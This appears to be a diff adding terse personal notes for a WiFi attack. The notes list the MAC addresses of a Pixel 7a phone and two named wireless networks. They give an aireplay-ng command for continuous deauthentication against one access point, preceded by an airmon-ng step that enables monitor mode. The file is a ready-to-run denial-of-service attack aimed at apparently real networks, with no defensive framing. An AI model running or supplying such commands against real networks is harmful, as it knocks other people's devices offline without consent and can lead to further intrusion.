@@ -1,0 +1,8 @@
+Google Pixel 7a MAC address: 8A:56:4E:BB:14:ED
+WiFi-2.4-2793: F4:06:8D:B7:75:F9 6
+VOO-1KAHLD0:  00:CB:7A:76:21:50 1
+
+
+sudo aireplay-ng --deauth 0 -a 00:CB:7A:76:21:50 wlp0s20f3mon
+
+but first sudo airmon-ng start wlp0s20f3mon 'channel'
